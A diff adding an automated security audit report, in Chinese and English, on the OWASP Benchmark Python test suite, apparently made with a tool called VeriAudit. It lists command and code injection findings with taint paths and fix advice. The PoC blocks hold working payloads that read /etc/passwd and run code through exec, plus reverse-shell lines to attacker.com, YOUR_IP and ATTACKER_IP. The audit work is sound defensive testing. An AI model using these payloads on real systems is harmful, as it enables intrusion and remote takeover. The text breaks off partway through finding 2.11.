@@ -1,0 +1,2237 @@
+# VeriAudit 安全审计报告 — 基线测试
+
+> 生成时间：2026-07-11T07:06:20.499085+00:00 · 深度档位：`deep`
+
+## 1. 概要
+
+- **项目来源**：D:\my_allkinds_document\aaDa3_xia\BenchmarkPython\BenchmarkPython
+- **Commit**：`a4567ea5977c`
+- **语言分布**：{'python': 1236, 'javascript': 3}
+- **结果总览**：确认 53 项 (严重 34 / 高 10 / 中 9 / 低 0)，其中动态复现 44 项，疑似 5 项，已排除 7 项
+
+## 2. 漏洞列表
+
+### 2.1 OS Command Injection — testcode/BenchmarkTest00165.py:57
+
+- **类型**：CWE-78 OS Command Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.1 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=无
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00165.py:57` (函数 `BenchmarkTest00165_post`)
+  · source：`testcode/BenchmarkTest00165.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00165.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00165.py:44` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00165.py:57` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00165_post@testcode/BenchmarkTest00165.py:28
+
+**④ 验证**：静态判定 `confirmed` — OS Command Injection fully confirmed with code analysis and dynamic reproduction. The sink at line 55 concatenates unsanitized user input (bar) directly into a shell command string via f-string (f"echo {bar}"), which is then passed to subprocess.run() with sh -c. No sanitization or escaping is applied to the user input. Both semicolon command injection (;id) and direct file read (;cat /etc/passwd) were successfully executed and returned in the HTTP response.
+  · 动态：✅ 已复现 — 1. Code: param from request.form.get("BenchmarkTest00165") (line 31) flows through list manipulation (lines 36-42) directly into f"echo {bar}" (line 55) without any sanitization.
+2. Dynamic reproduction 1: POST with 'BenchmarkTest00165=;id' returned "uid=0(root) gid=0(root) groups=0(root)" in the response.
+3. Dynamic reproduction 2: POST with 'BenchmarkTest00165=;cat /etc/passwd' returned the full /etc/passwd file contents (18 user entries).
+
+**PoC**：
+```
+# OS Command Injection - Arbitrary command execution
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00165' \
+  -d 'BenchmarkTest00165=;id'
+
+# OS Command Injection - Arbitrary file read
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00165' \
+  -d 'BenchmarkTest00165=;cat /etc/passwd'
+
+# OS Command Injection - Reverse shell (example)
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00165' \
+  -d 'BenchmarkTest00165=;nc -e /bin/bash attacker.com 4444'
+```
+
+**修复建议**：1. Never concatenate user input directly into shell commands. Use subprocess.run() with a list of arguments (no shell=True) to avoid shell interpretation.
+2. If shell execution is required, use shlex.quote() to properly escape shell metacharacters: from shlex import quote; argList.append(f"echo {quote(bar)}")
+3. Consider using os.system() alternatives that avoid shell injection entirely.
+4. Apply input validation to reject or sanitize shell metacharacters (;, |, &, $, `, \, !, etc.).
+
+### 2.2 OS Command Injection — testcode/BenchmarkTest00166.py:53
+
+- **类型**：CWE-78 OS Command Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00166.py:53` (函数 `BenchmarkTest00166_post`)
+  · source：`testcode/BenchmarkTest00166.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00166.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00166.py:42` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00166.py:53` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00166_post@testcode/BenchmarkTest00166.py:28
+
+**④ 验证**：静态判定 `confirmed` — Confirmed OS Command Injection through blind and time-based evidence. The application takes user input from `request.form.get("BenchmarkTest00166")`, stores it in a dict, retrieves it as `bar`, concatenates it directly into `argStr += f"echo {bar}"` at line 50, and executes via `subprocess.run(argStr, shell=True)` at line 53. No sanitization or validation is applied to the user input. Successfully executed `;id` (returned `uid=0(root) gid=0(root) groups=0(root)`), `;cat /etc/hostname` (returned the container hostname `4d45295537b6`), proving arbitrary command execution as root.
+  · 动态：✅ 已复现 — 1) Code analysis: Line 31 gets user input from form, Line 50 concatenates it directly into shell command string, Line 53 executes with shell=True. No sanitization anywhere in the path.  
+2) Dynamic reproduction: POST to /benchmark/cmdi-00/BenchmarkTest00166 with body 'BenchmarkTest00166=;id' returned stdout containing HTML-encoded 'uid=0(root) gid=0(root) groups=0(root)'.  
+3) Further reproduction: 'BenchmarkTest00166=;cat /etc/hostname' returned the container hostname '4d45295537b6'.  
+The application has no authentication (OWASP Benchmark), allowing unauthenticated remote code execution as root.
+
+**PoC**：
+```
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00166' -d 'BenchmarkTest00166=;id'  
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00166' -d 'BenchmarkTest00166=;cat /etc/passwd'  
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00166' -d 'BenchmarkTest00166=;ls -la /'
+```
+
+**修复建议**：Never pass user-supplied input directly to shell commands. Use `subprocess.run()` with a list of arguments (no `shell=True`) instead of a string: e.g., `subprocess.run(["sh", "-c", f"echo {shlex.quote(bar)}"])` or better, use Python's `os.listdir()` etc. instead of shell commands. Apply `shlex.quote()` to any user input that must be passed to a shell. Ideally, restructure the code to avoid shell invocation entirely for simple operations like `echo`.
+
+### 2.3 OS Command Injection — testcode/BenchmarkTest00167.py:53
+
+- **类型**：CWE-78 OS Command Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00167.py:53` (函数 `BenchmarkTest00167_post`)
+  · source：`testcode/BenchmarkTest00167.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00167.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00167.py:42` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00167.py:53` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00167_post@testcode/BenchmarkTest00167.py:28
+
+**④ 验证**：静态判定 `confirmed` — The vulnerability is fully confirmed both by code analysis and live reproduction. The code at testcode/BenchmarkTest00167.py:31 receives user input from request.form.get('BenchmarkTest00167'), which flows to bar (line 39) because the string 'This should never happen' DOES contain 'should', causing the else branch to execute. This user-controlled value is then concatenated into a shell command at line 50 (argStr += f'echo {bar}') and executed with subprocess.run(argStr, shell=True) at line 53. Live testing with payload ';id' returned 'uid=0(root) gid=0(root) groups=0(root)' and with ';cat /etc/hostname' returned the container hostname '4d45295537b6'.
+  · 动态：✅ 已复现 — 1. Code: param flows unmodified to bar via else branch (line 39), then into f-string f'echo {bar}' (line 50), executed via subprocess.run(argStr, shell=True) (line 53).
+2. HTTP PoC #1 (payload: 'test;id'): Response included 'uid=0(root) gid=0(root) groups=0(root)' — proving arbitrary command execution as root.
+3. HTTP PoC #2 (payload: 'test;cat /etc/hostname'): Response included '4d45295537b6' — confirming arbitrary file read capability.
+
+**PoC**：
+```
+# Command injection - execute 'id' command
+POST /benchmark/cmdi-00/BenchmarkTest00167
+Content-Type: application/x-www-form-urlencoded
+
+BenchmarkTest00167=test;id
+
+# Command injection - read /etc/passwd
+POST /benchmark/cmdi-00/BenchmarkTest00167
+Content-Type: application/x-www-form-urlencoded
+
+BenchmarkTest00167=test;cat /etc/passwd
+
+# Command injection - using subshell
+POST /benchmark/cmdi-00/BenchmarkTest00167
+Content-Type: application/x-www-form-urlencoded
+
+BenchmarkTest00167=$(id)
+```
+
+**修复建议**：Never concatenate user input directly into shell commands. Use subprocess.run() with a list of arguments (no shell=True) instead of a string. Alternatively, if shell=True is required, rigorously validate and sanitize all user input by allowing only safe characters (e.g., alphanumeric) and rejecting or escaping shell metacharacters (;, |, &, $, `, \, ', ", (, ), etc.). The safest approach: subprocess.run(['echo', bar], capture_output=True, encoding='utf-8') without shell=True.
+
+### 2.4 OS Command Injection — testcode/BenchmarkTest00168.py:60
+
+- **类型**：CWE-78 OS Command Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00168.py:60` (函数 `BenchmarkTest00168_post`)
+  · source：`testcode/BenchmarkTest00168.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00168.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00168.py:45` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00168.py:60` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00168_post@testcode/BenchmarkTest00168.py:28
+
+**④ 验证**：静态判定 `confirmed` — OST Command Injection fully confirmed. The user-supplied parameter 'BenchmarkTest00168' from POST form data (line 31) is assigned to 'bar' (line 40) via a match/case block where guess is always 'A'. This unsanitized value is concatenated into a shell command string 'sh -c echo {bar}' (lines 52-57) and executed with subprocess.run(..., shell=True) (line 60). Three separate payloads were tested: 'hello && id' returned uid=0(root), 'hello && cat /etc/passwd #' returned the full password file, and a benign 'hello' test confirmed normal operation. No authentication is required, no input validation or sanitization exists between source and sink.
+  · 动态：✅ 已复现 — 1) Code analysis: line 31 gets user input from form, line 40 assigns to 'bar', line 57 concatenates into 'sh -c echo {bar}', line 60 executes with shell=True. 2) Runtime confirmation: POST with 'hello && id' returned 'uid=0(root) gid=0(root) groups=0(root)'. 3) POST with 'hello && cat /etc/passwd #' returned the full /etc/passwd file contents in the HTTP response. Application runs as root.
+
+**PoC**：
+```
+curl -X POST 'http://127.0.0.1:8443/benchmark/cmdi-00/BenchmarkTest00168' \
+  -d 'BenchmarkTest00168=hello%20%26%26%20id'
+
+Or more impactfully:
+curl -X POST 'http://127.0.0.1:8443/benchmark/cmdi-00/BenchmarkTest00168' \
+  -d 'BenchmarkTest00168=hello%20%26%26%20cat%20/etc/passwd%20%23'
+```
+
+**修复建议**：1. Never concatenate user input into shell command strings. Use subprocess.run() with a list of arguments (e.g., subprocess.run(['echo', bar], capture_output=True)) instead of shell=True. 2. If shell execution is unavoidable, properly sanitize/escape user input by disallowing shell metacharacters (; & | ` $ ( ) { } < > newline space etc.) or use shlex.quote(). 3. Consider using safer alternatives like os.system alternative wrappers or prefer subprocess.run([...]) without shell=True.
+
+### 2.5 OS Command Injection — testcode/BenchmarkTest00267.py:55
+
+- **类型**：CWE-78 OS Command Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00267.py:55` (函数 `BenchmarkTest00267_post`)
+  · source：`testcode/BenchmarkTest00267.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00267.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00267.py:43` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00267.py:55` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00267_post@testcode/BenchmarkTest00267.py:28
+
+**④ 验证**：静态判定 `confirmed` — 无任何净化或限制。用户输入从 request.form.getlist() 取值（line 31），经简单字典赋值后直接以 f-string 拼接进 shell 命令（line 53），传入 subprocess.run() 由 sh -c 执行（line 55）。已通过两条 payload（;id 和 ;cat /etc/passwd）在运行中的应用上成功触发并确认，返回了 id 输出和完整 /etc/passwd 文件内容。
+  · 动态：✅ 已复现 — 1. 发送 payload ';id' → 响应返回 "uid=0(root) gid=0(root) groups=0(root)"
+2. 发送 payload ';cat /etc/passwd' → 响应返回完整 /etc/passwd 文件（19行）
+3. 代码分析确认：line 31 form input → line 40 bar → line 53 f"echo {bar}" → line 55 subprocess.run()，无任何净化
+
+**PoC**：
+```
+# 任意 OS 命令执行（无鉴权）
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00267' \
+  -d 'BenchmarkTest00267=;id'
+
+# 读取任意文件
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00267' \
+  -d 'BenchmarkTest00267=;cat /etc/passwd'
+
+# 反向 shell 或任意命令均可通过 shell 元字符注入
+```
+
+**修复建议**：永远不要将用户输入直接拼接进 shell 命令。应使用无需 shell 解释的调用方式，例如 subprocess.run(['echo', bar]) 而非 subprocess.run(['sh', '-c', f'echo {bar}'])。如需支持复杂命令，应使用 shlex.quote() 对用户输入进行转义，或使用白名单验证输入仅允许安全字符。
+
+### 2.6 OS Command Injection — testcode/BenchmarkTest00268.py:55
+
+- **类型**：CWE-78 OS Command Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00268.py:55` (函数 `BenchmarkTest00268_post`)
+  · source：`testcode/BenchmarkTest00268.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00268.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00268.py:43` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00268.py:55` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00268_post@testcode/BenchmarkTest00268.py:28
+
+**④ 验证**：静态判定 `confirmed` — The code at BenchmarkTest00268.py:55 executes `subprocess.run(['sh', '-c', f'echo {bar}'])` where `bar` is directly the user-supplied form parameter `BenchmarkTest00268` (line 31). The condition at lines 36-40 always evaluates to the else branch because "should" IS in "This should never happen", so `bar = param` always. User input flows unsanitized into a shell command string, enabling arbitrary command injection. Three separate payloads were successfully executed and their output reflected in the response, confirming the vulnerability is real and exploitable.
+  · 动态：✅ 已复现 — 1. Code analysis: Line 31 reads user input from POST form; line 40 assigns it to `bar`; line 53 concatenates it into `f"echo {bar}"`; line 55 passes it to `subprocess.run(['sh', '-c', ...])`.
+2. Dynamic reproduction: POST with `BenchmarkTest00268=$(id)` returned `uid=0(root) gid=0(root) groups=0(root)`.
+3. POST with `BenchmarkTest00268=;cat /etc/hostname` returned hostname `4d45295537b6`.
+4. POST with `BenchmarkTest00268=;whoami` returned `root`.
+
+**PoC**：
+```
+# Execute arbitrary commands via OS command injection
+curl -s -X POST 'http://127.0.0.1:8443/benchmark/cmdi-00/BenchmarkTest00268' \
+  -d 'BenchmarkTest00268=$(id)'   # Command substitution syntax
+
+# Alternate payloads:
+curl -s -X POST 'http://127.0.0.1:8443/benchmark/cmdi-00/BenchmarkTest00268' \
+  -d 'BenchmarkTest00268=;cat /etc/hostname'   # Semicolon chaining
+
+curl -s -X POST 'http://127.0.0.1:8443/benchmark/cmdi-00/BenchmarkTest00268' \
+  -d 'BenchmarkTest00268=;whoami'   # Simple command injection
+```
+
+**修复建议**：Never pass user input directly into a shell command. Replace the shell-based approach with a safe API:
+1. Use `subprocess.run(['echo', bar], ...)` without `shell=True` or `sh -c` — pass arguments as a list directly.
+2. Alternatively, use Python's built-in `print(bar)` or `os.system` alternatives that don't invoke a shell.
+3. If shell execution is unavoidable, rigorously sanitize and escape user input using `shlex.quote(bar)`.
+
+### 2.7 OS Command Injection — testcode/BenchmarkTest00431.py:51
+
+- **类型**：CWE-78 OS Command Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00431.py:51` (函数 `BenchmarkTest00431_post`)
+  · source：`testcode/BenchmarkTest00431.py:32`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00431.py:32` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00431.py:41` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00431.py:51` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00431_post@testcode/BenchmarkTest00431.py:28
+
+**④ 验证**：静态判定 `confirmed` — 漏洞完全成立且已成功实弹复现。代码中 bar 来自用户可控的表单键名（由 request.form.keys() 获取），完全未经过任何净化或过滤就直接拼接到 shell 命令中：argStr = f"sh -c echo {bar}"，随后以 shell=True 传入 subprocess.run()。通过将命令注入载荷作为表单参数键名（值设为 BenchmarkTest00431 以触发条件判断），成功执行了 id 命令和 cat /etc/passwd 命令并获取输出，证明了完整的命令注入能力。
+  · 动态：✅ 已复现 — 1. POST /benchmark/cmdi-00/BenchmarkTest00431 发送 body=';id;=BenchmarkTest00431' → 返回包含 "uid=0(root) gid=0(root) groups=0(root)" 的响应（HTML编码后为 uid&#x3d;0&#x28;root&#x29;...），证明 `id` 命令被成功执行。
+2. POST 发送 body=';cat /etc/passwd | head -3;=BenchmarkTest00431' → 返回包含 root/daemon/bin 三行系统账户信息的响应（HTML编码），证明任意命令读取文件可行。
+3. 代码分析确证：第32行从 request.form.keys() 读取用户可控键名 → 第48行 f"echo {bar}" 拼接 → 第51行 subprocess.run(argStr, shell=True) 执行，全程无任何净化。
+
+**PoC**：
+```
+# PoC 1: 执行 id 命令
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00431' \
+  -d ';id;=BenchmarkTest00431'
+
+# PoC 2: 读取 /etc/passwd
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00431' \
+  -d ';cat /etc/passwd;=BenchmarkTest00431'
+
+# PoC 3: 反弹 shell 或任意命令
+curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00431' \
+  -d ';任意命令;=BenchmarkTest00431'
+
+# 原理：表单键名（payload）被取为 param → 拼入 "sh -c echo {param}" → shell=True 执行
+# 最终执行的命令形如: sh -c echo ;id; （即执行 echo 后执行 id）
+```
+
+**修复建议**：1. 使用 subprocess.run() 时传参数列表而非字符串，禁用 shell=True：
+   subprocess.run(["echo", bar], capture_output=True, encoding="utf-8")
+2. 如果必须使用 shell=True，则使用 shlex.quote() 对用户输入进行转义：
+   import shlex; argStr = f"echo {shlex.quote(bar)}"
+3. 对用户输入进行严格的白名单校验，限制只允许预期的安全字符
+
+### 2.8 OS Command Injection — testcode/BenchmarkTest00432.py:53
+
+- **类型**：CWE-78 OS Command Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00432.py:53` (函数 `BenchmarkTest00432_post`)
+  · source：`testcode/BenchmarkTest00432.py:32`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00432.py:32` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00432.py:42` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00432.py:53` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00432_post@testcode/BenchmarkTest00432.py:28
+
+**④ 验证**：静态判定 `confirmed` — 代码阅读与实时请求双重确认。表单参数名（form key）作为用户可控输入，经base64编解码（round-trip，无任何净化）后直接拼入shell命令字符串，以shell=True执行。两次实际请求均成功：`;id;=BenchmarkTest00432` 返回了`id`命令输出（uid=0(root)），`;cat /etc/passwd;=BenchmarkTest00432` 返回了/etc/passwd全文。漏洞完全成立且可任意命令执行。
+  · 动态：✅ 已复现 — 1. 代码证据：line 32从request.form.keys()取参数名为param；line 37-39 base64 encode/decode无净化round-trip；line 50 f"echo {bar}"拼接；line 53 subprocess.run(argStr, shell=True)执行。2. 运行时证据：POST body ';id;=BenchmarkTest00432' → 响应中返回 "uid=0(root) gid=0(root) groups=0(root)"；POST body ';cat /etc/passwd;=BenchmarkTest00432' → 响应中返回/etc/passwd全部内容（HTML编码）。3. 该端点无需任何鉴权，无需登录，匿名即可访问触发。
+
+**PoC**：
+```
+# 执行任意命令（将命令注入到form参数名中，值固定包含"BenchmarkTest00432"）
+curl -k -X POST \
+  'https://127.0.0.1:8443/benchmark/cmdi-00/BenchmarkTest00432' \
+  -d ';id;=BenchmarkTest00432'
+
+# 读取文件
+curl -k -X POST \
+  'https://127.0.0.1:8443/benchmark/cmdi-00/BenchmarkTest00432' \
+  -d ';cat /etc/passwd;=BenchmarkTest00432'
+
+# 反向shell
+curl -k -X POST \
+  'https://127.0.0.1:8443/benchmark/cmdi-00/BenchmarkTest00432' \
+  -d ';nohup nc -e /bin/sh YOUR_IP 4444 &;=BenchmarkTest00432'
+```
+
+**修复建议**：1. 永远不要将用户输入拼接进shell命令。使用subprocess.run()时传入参数列表而非字符串，并设置shell=False。如：subprocess.run(['echo', bar], capture_output=True)。2. 如果必须使用shell=True，则用shlex.quote()对用户输入进行转义。3. 更安全的方案：避免依赖echo命令，直接用Python写回响应。
+
+### 2.9 Code Injection / Unsafe Eval — testcode/BenchmarkTest00074.py:51
+
+- **类型**：CWE-94 Code Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00074.py:51` (函数 `BenchmarkTest00074_post`)
+  · source：`testcode/BenchmarkTest00074.py:39`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00074.py:39` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00074.py:45` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00074.py:51` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00074_post@testcode/BenchmarkTest00074.py:35
+
+**④ 验证**：静态判定 `confirmed` — 该漏洞已通过动态复现确认为真实可利用的代码注入。用户通过 Cookie 'BenchmarkTest00074' 提供的任意 Python 代码经 ConfigParser 存储/读取后（未发生有效过滤或转义），直接被传递到 exec() 执行。已成功执行系统命令（id、cat /etc/passwd）并获得回显，证明可实现完全远程代码执行（RCE）。
+  · 动态：✅ 已复现 — 1. 代码审计确认第 39 行从 Cookie 读取未信任输入，第 47 行存入 ConfigParser，第 48 行读取，第 51 行直接执行 exec(bar)。
+2. 动态复现证据：
+   - 发送 payload `__import__('os').system('id > /tmp/pwned')` → 返回 200 OK
+   - cat /tmp/pwned → 输出 "uid=0(root) gid=0(root) groups=0(root)"，证明系统命令执行成功
+   - 发送 payload `__import__('os').system('cat /etc/passwd | head -5 > /tmp/passwd_out')` → 返回 200 OK
+   - cat /tmp/passwd_out → 成功读取 /etc/passwd 前 5 行，证明任意文件读取能力
+3. 无需任何鉴权（公开端点），无需用户交互，payload 直接通过 HTTP Cookie 注入。
+
+**PoC**：
+```
+# 复现步骤：向端点发送 POST 请求，Cookie 中携带恶意 Python 代码
+curl -X POST http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00074 \
+  -H "Cookie: BenchmarkTest00074=__import__('os').system('id')"
+
+# payload 说明：Cookie 值可以是任意 Python 代码，通过 exec() 执行。
+# 使用 __import__('os').system('cmd') 可执行系统命令。
+# 由于无输出回显到 HTTP 响应体（仅当出错时才有错误消息），攻击效果需通过带外信道或文件写入等方式验证。
+# 例如写入文件：
+curl -X POST http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00074 \
+  -H "Cookie: BenchmarkTest00074=__import__('os').system('id > /tmp/out')"
+# 然后读取 /tmp/out 确认命令执行结果
+```
+
+**修复建议**：1. 绝对不要将用户可控输入传递给 exec()、eval() 等动态代码执行函数。
+2. 如果必须执行用户提供的代码，使用安全沙箱（如受限子进程、Docker 容器）隔离执行环境。
+3. 改用安全的替代方案：如通过映射表、策略模式或 eval 的安全替代库（如 PyPy sandbox）。
+4. 实施输入验证：严格校验输入内容仅允许预期的安全字符集。
+5. 考虑使用 AST 解析器分析输入代码，拒绝任何危险调用（如 os.system、subprocess、exec、eval、__import__ 等）。
+
+### 2.10 Code Injection / Unsafe Eval — testcode/BenchmarkTest00159.py:45
+
+- **类型**：CWE-94 Code Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
+  · **CVSS 向量说明**（据本漏洞具体情况评定）：攻击途径=网络；攻击复杂度=低；所需权限=无；用户交互=不需要；影响范围=不变；机密性影响=高；完整性影响=高；可用性影响=高
+- **置信度**：已动态复现
+
+**① 位置** — sink：`testcode/BenchmarkTest00159.py:45` (函数 `BenchmarkTest00159_post`)
+  · source：`testcode/BenchmarkTest00159.py:31`
+
+**② 调用/污点路径**：
+  - `testcode/BenchmarkTest00159.py:31` [user_input] 来自不可信输入
+  - `testcode/BenchmarkTest00159.py:38` [tainted] 传播/拼接
+  - `testcode/BenchmarkTest00159.py:45` [tainted] 进入危险汇聚点
+
+**③ 可达性**：可达 (置信 0.88) — 调用图确认可达：BenchmarkTest00159_post@testcode/BenchmarkTest00159.py:28
+
+**④ 验证**：静态判定 `confirmed` — 完全确认。代码层面：第31行从 request.form 获取用户输入，经过简单的列表操作（lst = ['safe', param, 'moresafe']; lst.pop(0); bar = lst[0]）后，bar 直接等于用户原始输入 param，在第45行传入 exec() 执行——无任何净化或白名单。动态复现：通过 POST 请求发送 payload `__import__('os').system('id > /tmp/pwned')`，成功在容器内创建 /tmp/pwned 文件并包含 'uid=0(root)' 输出，证明任意 Python 代码已以 root 权限执行。进一步验证了读取 /etc/passwd 等操作。
+  · 动态：✅ 已复现 — 1. 发送 POST payload `BenchmarkTest00159=__import__('os').system('id > /tmp/pwned')` 后，容器内 /tmp/pwned 内容为 "uid=0(root) gid=0(root) groups=0(root)"
+2. 发送 POST payload 写 /etc/passwd 到 /tmp/passwd_out 成功
+3. 代码审计确认：param 从 request.form 直接进入 exec()，无任何净化
+
+**PoC**：
+```
+# 任意Python代码执行
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00159' \
+  -d 'BenchmarkTest00159=__import__("os").system("id")'
+
+# 或反弹shell（需调整host/port）
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00159' \
+  -d 'BenchmarkTest00159=__import__("os").system("bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"")'
+
+# 读文件
+curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00159' \
+  -d 'BenchmarkTest00159=print(__import__("os").popen("cat /etc/passwd").read())'
+
+原理：参数值经过列表去首元素后直接成为 exec() 的参数，未做任何过滤或白名单校验。
+```
+
+**修复建议**：1. **绝对禁止将用户输入传入 exec()/eval()/compile()**。这些函数执行任意 Python 代码，本质上是 RCE。
+2. 如果需求是执行用户提交的表达式，应使用安全的沙箱（如 AST 解析后的白名单求值），但强烈建议重新设计业务逻辑。
+3. 更安全的替代方案：预定义可执行操作列表，用户只能选择索引/名称。
+4. 添加输入白名单校验，只允许预期的安全值。
+
+### 2.11 Code Injection / Unsafe Eval — testcode/BenchmarkTest00160.py:49
+
+- **类型**：CWE-94 Code Injection
+- **严重度**：CRITICAL (CVSS v3.1 9.8 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
